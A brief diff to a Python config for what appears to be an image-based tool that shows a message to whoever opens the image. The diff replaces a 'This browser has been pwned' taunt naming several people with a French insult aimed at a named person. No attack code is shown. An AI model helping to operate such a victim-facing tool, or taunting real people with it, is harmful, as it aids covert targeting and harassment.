@@ -25,7 +25,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "This browser has been pwned by mood. Ensa Camera Enes Thunder Abderaman https://tenor.com/view/crying-one-piece-anime-gif-4502646032764566609 ", # Message to show
+        "message": "Abder T con ou quoi ?", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
